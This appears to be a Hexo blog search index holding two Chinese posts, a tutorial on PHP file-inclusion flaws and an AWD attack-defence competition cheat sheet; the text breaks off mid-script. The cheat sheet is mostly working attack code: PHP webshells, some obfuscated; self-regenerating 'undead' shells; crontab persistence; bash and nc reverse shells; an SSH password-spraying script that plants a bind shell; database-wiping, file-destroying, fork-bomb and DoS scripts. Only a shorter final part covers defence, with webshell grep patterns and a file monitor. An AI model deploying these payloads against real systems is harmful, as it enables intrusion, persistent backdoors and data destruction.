<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件包含</title>
      <link href="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞概述"><a href="#文件包含漏洞概述" class="headerlink" title="文件包含漏洞概述"></a>文件包含漏洞概述</h2><h3 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h3><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。</p><h3 id="文件包含漏洞产生原理"><a href="#文件包含漏洞产生原理" class="headerlink" title="文件包含漏洞产生原理"></a>文件包含漏洞产生原理</h3><p>文件包含函数加载的参数没有经过严格过滤或严格定义，可以被用户控制，包含其他恶意文件，导致执行了非预期代码。</p><p>这种包含可以是代码更加灵活，所以通常会把被包含的文件设置为变量进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p><h4 id="1-常见的漏洞代码"><a href="#1-常见的漏洞代码" class="headerlink" title="1.常见的漏洞代码"></a>1.常见的漏洞代码</h4><pre><code>&lt;?php    $filename=$_GET[&#39;filename&#39;];   include($filename);?&gt;</code></pre><h4 id="2-访问-url"><a href="#2-访问-url" class="headerlink" title="2.访问  url"></a>2.访问  url</h4><pre><code>http://xxx/xxx.php?filename=show.php改变filename值即可改变代码中的包含文件</code></pre><p><code>$_GET[&#39;filename&#39;]</code>参数，如果开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><p>show.php即可为用户上传的可执行的恶意脚本文件</p><p>包含文件内容只要符合php语法都能被当成php代码进行解析，无关后缀名是什么。</p><h5 id="php相关配置"><a href="#php相关配置" class="headerlink" title="php相关配置"></a>php相关配置</h5><pre><code>allow_url_fopen=on// 本地文件包含(LFI)，但这个无论on或off，本地文件包含都存在allow_url_include=on//  远程文件包含(RFI)</code></pre><h4 id="3-存在文件包含的脚本语言及函数"><a href="#3-存在文件包含的脚本语言及函数" class="headerlink" title="3.存在文件包含的脚本语言及函数"></a>3.存在文件包含的脚本语言及函数</h4><ul><li><p>php</p><pre><code>require:函数出现错误时，会直接报错并退出程序执行require_once:出错直接退出，且仅包含一次。在脚本执行期间同一个文件可能被多次使用，确保包含一次以避免函数重新定义，变量重新赋值等问题。include:出现错误时，会出现警告但是程序会继续执行include_once:出现错误时，会抛出警告，且仅包含一次</code></pre></li></ul><p>举个例子：</p><p>index.php</p><pre><code></code></pre><ul><li><p>jsp/servlet</p><pre><code>ava.io.file()java.io.filereader()</code></pre></li><li><p>asp</p><pre><code>include fileinclude virtual</code></pre></li></ul><h4 id="4-文件包含漏洞的危害"><a href="#4-文件包含漏洞的危害" class="headerlink" title="4.文件包含漏洞的危害"></a>4.文件包含漏洞的危害</h4><ol><li><p>敏感信息泄露</p></li><li><p>获取网站权限(webshell)</p></li><li><p>任意命令执行</p></li></ol><h1 id="文件包含漏洞类型"><a href="#文件包含漏洞类型" class="headerlink" title="文件包含漏洞类型"></a>文件包含漏洞类型</h1><h3 id="本地文件包含漏洞-LFI"><a href="#本地文件包含漏洞-LFI" class="headerlink" title="本地文件包含漏洞(LFI)"></a>本地文件包含漏洞(LFI)</h3><p>能够读取执行包含本地文件的漏洞，称为本地文件包含漏洞。</p><p>包含服务器本身存在的恶意文件</p><p>a.txt</p><pre><code>&lt;?phpphpinfo();&gt;</code></pre><p>b.php</p><pre><code>&lt;?php$b=$_GET[&#39;id&#39;];include($b);&gt;</code></pre><p>payload</p><pre><code>127.0.0.1/phptest/b.php?id=a.txt返回phpinfo页面</code></pre><p>注意：</p><ul><li><p>两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）</p><p>（相对路径./当前目录../上级目录）</p></li><li><p>被包含的页面的<code>后缀名无论是什么</code>都会当做php解析</p></li></ul><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>如果php的配置选项<code>allow_url_include、allow_url_fopen</code>状态为on的话，则<code>include/require</code>函数是可以加载远程文件的，这种漏洞被称为远程包含文件(RFI)</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/25/AWD%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/25/AWD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>后台执行命令</p><pre><code>php kill.php &gt;/tmp/kill.log 2&gt;&amp;1 &amp;</code></pre><blockquote><p><code>php kill.php</code>命令</p><p><code>&gt; /tmp/kill.log</code> 将命令执行日志写到tmp目录下的kill.log文件中</p><p><code>2&gt;&amp;1 &amp;</code>后台执行命令</p></blockquote><h1 id="AWD-规则"><a href="#AWD-规则" class="headerlink" title="AWD 规则"></a><a href="https://so.csdn.net/so/search?q=AWD&spm=1001.2101.3001.7020">AWD</a> 规则</h1><p>AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。</p><ul><li>1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li><li>2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；</li><li>3.flag在主办方的设定下每隔一定时间刷新一轮；</li><li>4.各队一般都有一个初始分数；</li><li>5.flag一旦被其他队伍拿走，该队扣除一定积分；</li><li>6.得到flag的队伍加分；</li><li>7.一般每个队伍会给一个低权限用户，非root权限；</li><li>8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。 # 前期准备</li></ul><p>SSH登录</p><p>口令登录</p><p>命令格式: ssh客户端用户名@服务器ip地址</p><pre><code>ssh  用户名@ipssh  ctf@</code></pre><p>如果不是默认端口，可以使用-p修改端口</p><pre><code>ssh -p 指定端口号 用户名@ip</code></pre><p>密钥登录</p><p>用id_rsa用于登录靶机</p><pre><code>sftp -i id_rsa ctf@ip</code></pre><p>压缩网站源码</p><p>用于备份和代码审计修复以及分析攻击点，每个服务器的网站都一样</p><pre><code>tar -zcvf /tmp/html.zip /var/www/html</code></pre><p><img src="/2023/07/25/AWD%E6%80%BB%E7%BB%93/Users\xdm\AppData\Roaming\Typora\typora-user-images\image-20230725232413954.png" alt="image-20230725232413954"></p><p>2.备份数据库</p><ul><li>备份指定的多个数据库</li></ul><pre><code>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql</code></pre><p>无 lock tables 权限的解决方法</p><pre><code>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql</code></pre><ul><li>恢复备份（在 MySQL 终端下执行）</li></ul><pre><code>source FILE_PATH</code></pre><ul><li>重置 MySQL 密码（在 MySQL 终端下执行）</li></ul><p>方法 1</p><pre><code>set password for 用户名@localhost = password(&quot;新密码&quot;)</code></pre><p>方法 2</p><pre><code>mysqladmin -u用户名 -p旧密码 password 新密码</code></pre><p>3.下载到本地</p><pre><code>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file</code></pre><h2 id="查找预留后门"><a href="#查找预留后门" class="headerlink" title="查找预留后门"></a>查找预留后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。</p><p>可以使用 seay进行代码审计</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。</p><p>所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。</p><p>以下是一些服务端口的漏洞：</p><p>22：ssh弱口令</p><p>873：未授权访问漏洞</p><p>3306：mysql弱口令</p><p>6379：redis未授权访问漏洞</p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>信息收集</p><ul><li>nmap、Routescan</li><li>Python 脚本</li></ul><pre><code>import requestsfor x in range(2,255):    url = &quot;&lt;http://192.168.1&gt;.&#123;&#125;&quot;.format(x)    try:        r = requests.post(url)        print(url)        except:        pass</code></pre><h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>curl读flag</p><pre><code>C:\\Users\\admin&gt;curl &quot;&lt;http://192.168.182.130:8801/include/shell.php&gt;&quot; -d &quot;admin_ccmd=system(&#39;cat /f*&#39;);&quot;SL&#123;4a0be463dd85555090f2216795677916d2447242&#125;flag&#123;glzjin_wants_a_girl_friend&#125;</code></pre><p>脚本</p><pre><code>端口#coding=utf-8import requestsurl_head=&quot;&lt;http://192.168.182.130&gt;&quot;   #网段url=&quot;&quot;shell_addr=&quot;/upload/url/shell.php&quot; #木马路径passwd=&quot;pass&quot;                   #木马密码#port=&quot;80&quot;payload = &#123;passwd: &#39;System(\\&#39;cat /flag\\&#39;);&#39;&#125;# find / -name &quot;flag*&quot;#清空上次记录flag=open(&quot;flag.txt&quot;,&quot;w&quot;)flag.close()flag=open(&quot;flag.txt&quot;,&quot;a&quot;)for i in range(8000,8004):    url=url_head+&quot;:&quot;+str(i)+shell_addr    try:        res=requests.post(url,payload)#,timeout=1        if res.status_code == requests.codes.ok:            result = res.text            print (result)            flag.write(result+&quot;\\n&quot;)        else:            print (&quot;shell 404&quot;)    except:        print (url+&quot; connect shell fail&quot;)flag.close()</code></pre><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>常用语言的一句话木马</p><pre><code>php： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;      &lt;?php eval($_GET[&#39;pass&#39;]);asp：   &lt;%eval request (&quot;pass&quot;)%&gt;aspx：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。</p><pre><code>&lt;?php eval($_GET[&#39;pass&#39;]);/shell.php?pass=eval($_POST[1]);连接密码：1</code></pre><h2 id="隐藏shell"><a href="#隐藏shell" class="headerlink" title="隐藏shell"></a>隐藏shell</h2><p>shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除</p><p><strong>1.把shell.php命名为.shell.php</strong></p><p>.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现</p><p>完整命令如下</p><pre><code>[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php[sss@ecs-centos-7 awd]$ lsshell.php[sss@ecs-centos-7 awd]$ mv shell.php .shell.php[sss@ecs-centos-7 awd]$ ls[sss@ecs-centos-7 awd]$ ls -al总用量 12drwxrwxr-x 2 sss sss 4096 12月  29 22:52 .drwx------ 4 sss sss 4096 12月  29 22:51 ..-rw-rw-r-- 1 sss sss    9 12月  29 22:52 .shell.php</code></pre><p><strong>2.把shell.php命名为-shell.php</strong></p><p>从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、</p><p>命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了</p><p>完整命令如下</p><pre><code>[sss@ecs-centos-7 awd]$ ls-shell.php[sss@ecs-centos-7 awd]$ rm -shell.phprm：无效选项 -- sTry &#39;rm ./-shell.php&#39; to remove the file &quot;-shell.php&quot;.Try &#39;rm --help&#39; for more information.[sss@ecs-centos-7 awd]$ rm -rf -shell.phprm：无效选项 -- sTry &#39;rm ./-shell.php&#39; to remove the file &quot;-shell.php&quot;.Try &#39;rm --help&#39; for more information.</code></pre><h2 id="特殊的shell"><a href="#特殊的shell" class="headerlink" title="特殊的shell"></a>特殊的shell</h2><p>shell1：</p><pre><code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</code></pre><p>连接方式：php?2=assert密码是1。</p><p>shell2：</p><pre><code>&lt;?php$a=chr( 96^5);$b=chr( 57^79);$c=chr( 15^110);$d=chr( 58^86);$e= &#39;($_REQUEST[C])&#39;;@assert($a.$b.$c.$d.$e);?&gt;</code></pre><p>配置为?b=))99(rhC(tseuqeR+lave</p><p>shell3：</p><pre><code>&lt;?php$sF= &quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#39;n985de9&#39;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;</code></pre><p>配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</p><p>连接密码:0（零）</p><p>shell4：MD5木马</p><pre><code>&lt;?phpif(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;)@eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>shell5：MD5木马+利用header</p><p>2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来</p><pre><code>&lt;?phpecho &#39;hello&#39;;if(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;)if (@$_SERVER[&#39;HTTP_USER_AGENT&#39;] == &#39;flag&#39;)&#123;$test= &#39;flag&#39;;header(&quot;flag:$test&quot;);&#125;?&gt;</code></pre><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>不死马示例：</p><pre><code>&lt;?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = &#39;shell.php&#39;;$code = &#39;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#39;cmd&#39;]);&#125; ?&gt;&#39;;while (1)&#123;    file_put_contents($file,$code);    system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#39;);    usleep(5000);&#125;?&gt;#passwd=y0range857#POST传参：passwd=y0range857&amp;a=system(&#39;ls&#39;);</code></pre><p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入<a href="http://xxx/shell2.php?pass=pass%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82">http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。</a></p><p>写入shell， at.php内容</p><pre><code>&lt;?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = &#39;.login.php&#39;;$file1 = &#39;/admin/.register.php&#39;;$code = &#39;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#39;;while (1)&#123;    file_put_contents($file,$code);    system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#39;);    file_put_contents($file1,$code);    system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#39;);    usleep(5000);&#125;?&gt;</code></pre><p>浏览器访问at.php，会生成不死马at2.php</p><pre><code>url/upload/at.php</code></pre><p>再传入，执行命令，getshell</p><pre><code>url/upload/at2.php?passwd=obse007&amp;at=system(&#39;ls&#39;);</code></pre><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。</p><p><strong>crontab定时任务</strong></p><p>1.使用定时任务写马</p><pre><code>system(&#39;echo &quot;* * * * * echo \\&quot;&lt;?php  if(md5(\\\\\\\\\\\\\\\\\\$_POST[pass])==\\&#39;462d4a0e7cedd6b024a4d99f10c614d1\\&#39;)&#123;@eval(\\\\\\\\\\\\\\\\\\$_POST[1]);&#125;  \\&quot; &gt; /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#39;);</code></pre><p>密码：atkx</p><p>来指定用户运行指定的定时任务</p><p>2.使用定时任务发送带有flag的请求</p><pre><code>bash# 编辑 crontab：crontab -e*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d &#39;flag=&#39;$(cat /home/web/flag/flag)&#39;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#39;# 查询 crontab：crontab -l</code></pre><p>3.使用定时任务反弹shell</p><pre><code>bash -c bash&#39;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#39;nc -e /bin/bash 1.3.3.7 4444 bash</code></pre><p><strong>反弹shell</strong></p><p>nc反弹shell</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1</code></pre><p>本地</p><pre><code>nc -l -p 6666</code></pre><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>软连接语法：</p><pre><code>ln -s  [shell路径]   [新文件路径]</code></pre><p>使用方法：</p><p>访问/upload/new.php，实际上是访问/upload/shell.php</p><pre><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php</code></pre><p>软连接利用</p><pre><code>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.cssroot@086f12c38b93:~# cat /var/www/html/css/flag.cssSL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</code></pre><p>然后访问url/css/flag.css即可得到flag</p><h2 id="SSH弱密码利用"><a href="#SSH弱密码利用" class="headerlink" title="SSH弱密码利用"></a>SSH弱密码利用</h2><pre><code>#-*- coding:utf-8 -*-import paramikoip = &#39;192.168.1.137&#39;port = &#39;22&#39;username = &#39;root&#39;passwd = &#39;123456&#39;# ssh 用户名 密码 登陆def ssh_base_pwd(ip,port,username,passwd,cmd=&#39;cat /flag&#39;):    port = int(port)    ssh = paramiko.SSHClient()    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())    ssh.connect(hostname=ip, port=port, username=username, password=passwd)    stdin,stdout,stderr = ssh.exec_command(cmd)    result = stdout.read()    if not result :        print(&quot;无结果!&quot;)        result = stderr.read()    ssh.close()    return result.decode()a = ssh_base_pwd(ip,port,username,passwd)print(a)#SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</code></pre><p>批量</p><pre><code>#-*- coding:utf-8 -*-import paramikoimport threadingimport queueimport time#反弹shell pythonq=queue.Queue()#lock = threading.Lock()# ssh 用户名 密码 登陆def ssh_base_pwd(ip,port,username,passwd,cmd):    port = int(port)    ssh = paramiko.SSHClient()    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())    ssh.connect(hostname=ip, port=port, username=username, password=passwd)    stdin,stdout,stderr = ssh.exec_command(cmd)    result = stdout.read()    if not result :        result = stderr.read()    ssh.close()    return result.decode()def main(x):    shell = &#39;&#39;&#39;    #服务器端    import socket    import os    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    s.bind((&#39;0.0.0.0&#39;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量    con,addr=s.accept()     #接受一个客户端的连接    #print(con,addr)    for i in range(10):        cmd=con.recv(1024)        print(cmd)        command=cmd.decode()        if command.startswith(&#39;cd&#39;):            os.chdir(command[2:].strip())   #切换路径            result=os.getcwd()      #显示路径        else:            result=os.popen(command).read()        if result:            con.send(result.encode())        else:            con.send(b&#39;OK!&#39;)    &#39;&#39;&#39;    cmd = &#39;echo \\&quot;%s\\&quot; &gt; ./shell.py&#39; % (shell) +&#39;&amp;&amp; python3 ./shell.py&#39;    port = &#39;22&#39;    username = &#39;root&#39;    passwd = &#39;toor&#39;    ip = &#39;192.168.1.&#123;&#125;&#39;.format(x)    q.put(ip.strip(),block=True, timeout=None)    ip_demo=q.get()    #判断是否成功    try:        #lock.acquire()        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=&#39;id&#39;)        if res:            print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)            #lock.release()            ssh_base_pwd(ip_demo,port,username,passwd,cmd)    except:        print(&quot;[ - ]Ip: %s&quot; % ip_demo +&quot; is Failed&quot;)    if x &gt; 255:        print(&quot;Finshed!!!!!!!!&quot;)    q.task_done()#线程队列部分th=[]th_num=255for x in range(th_num):        t=threading.Thread(target=main,args=(x,))        th.append(t)for x in range(th_num):        th[x].start()for x in range(th_num):        th[x].join()#q.join()所有任务完成</code></pre><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="攻击搅屎"><a href="#攻击搅屎" class="headerlink" title="攻击搅屎"></a>攻击搅屎</h2><p>无限复制</p><pre><code>&lt;?php  set_time_limit(0);  ignore_user_abort(true);  while(1)&#123;      file_put_contents(randstr().&#39;.php&#39;,file_get_content(__FILE__));      file_get_contents(&quot;&lt;http://127.0.0.1/&gt;&quot;);  &#125;?&gt;</code></pre><p>修改数据库密码</p><pre><code>update mysql.user set authentication_string=PASSWORD(&#39;p4rr0t&#39;);# 修改所有用户密码flush privileges;UPDATE mysql.user SET User=&#39;aaaaaaaaaaaa&#39; WHERE user=&#39;root&#39;;flush privileges;delete from mysql.user ;#删除所有用户flush privileges;</code></pre><p>重启 apache2 和 nigix</p><pre><code>#!/usr/bin/env shwhile [[ 1 ]]do    service apache2 stop    service nginx stopdone &amp;</code></pre><p>循环删除</p><pre><code>&lt;?php    set_time_limit(0);    ignore_user_abort(1);    unlink(__FILE__);    function getfiles($path)&#123;        foreach(glob($path) as $afile)&#123;            if(is_dir($afile))                getfiles($afile.&#39;/*.php&#39;);            else                @file_put_contents($afile,&quot;#Anything#&quot;);                //unlink($afile);        &#125;    &#125;    while(1)&#123;        getfiles(__DIR__);        sleep(10);    &#125;?&gt;&lt;?php    set_time_limit(0);    ignore_user_abort(1);    array_map(&#39;unlink&#39;, glob(&quot;some/dir/*.php&quot;));?&gt;</code></pre><p>删除数据库</p><pre><code>#!/usr/bin/env python3  import base64  def rm_db(db_user,my_db_passwd):      cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e &#39;&quot;%(db_user,my_db_passwd)      db_name = [&#39;performance_schema&#39;,&#39;mysql&#39;,&#39;flag&#39;]      for db in db_name:          cmd += &quot;drop database %s;&quot;%db      cmd += &quot;&#39;&quot;      return cmd</code></pre><p>fork_bomb</p><pre><code>#!/bin/sh/bin/echo &#39;.() &#123; .|.&amp; &#125; &amp;&amp; .&#39; &gt; /tmp/aaa;/bin/bash /tmp/aaa;</code></pre><p>DOS脚本（非必要最好不要用）</p><pre><code>import socketimport timeimport threadingmax=90000000port=80                 #端口host=&quot;192.168.92.154&quot;   #IPpage=&quot;/index.php&quot;bag=(&quot;POST %s HTTP/1.1\\r\\n&quot;    &quot;host: %s\\r\\n&quot;    &quot;Content-Length: 1000000000\\r\\n&quot;    &quot;Cookie: 1998\\r\\n&quot;    &quot;\\r\\n&quot; % (page,host))socks = []def connect():    global socks    for i in range(0,max):        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        try:            s.connect((host,port))            s.send(bag.encode(&quot;utf-8&quot;))            socks.append(s)        except Exception as ex:            time.sleep(1)def send():    global socks    while True:        for s in socks:            try:                print(&quot;攻击中....&quot;)            except Exception as ex:                socks.remove(s)                s.close()        time.sleep(0.1)One = threading.Thread(target=connect,args=())Two = threading.Thread(target=send,args=())One.start()Two.start()</code></pre><h1 id="防守思路"><a href="#防守思路" class="headerlink" title="防守思路"></a>防守思路</h1><h2 id="基础查杀"><a href="#基础查杀" class="headerlink" title="基础查杀"></a>基础查杀</h2><p>寻找最近20分钟修改过的文件</p><pre><code>find /var/www/html -name *.php -mmin -20</code></pre><p>寻找行数最短的文件：</p><pre><code>find ./ -name &#39;*.php&#39; | xargs wc -l | sort -u</code></pre><p>关键字查杀</p><pre><code>find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system()&#39;</code></pre><p>查找命令执行函数</p><pre><code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &#39;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&#39;</code></pre><h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>脚本</p><pre><code># -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;Special_string = &#39;drops_log&#39;  # 免死金牌UNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123;    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125;def isListLike(value):    return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# 目录创建def mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# 获取当前所有文件路径def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# 计算机文件MD5值def calcMD5(filepath):    try:        with open(filepath,&#39;rb&#39;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# 获取所有文件MD5def getfilemd5dict(filelist = []):    filemd5dict = &#123;&#125;    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# 备份所有文件def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#39;bak&#39;])if __name__ == &#39;__main__&#39;:    print u&#39;---------start------------&#39;    for value in Special_path:        mkdir_p(Special_path[value])    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG    print u&#39;[*] pre work end!&#39;    while True:        file_list = getfilelist(CWD)        # 移除新上传文件        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, 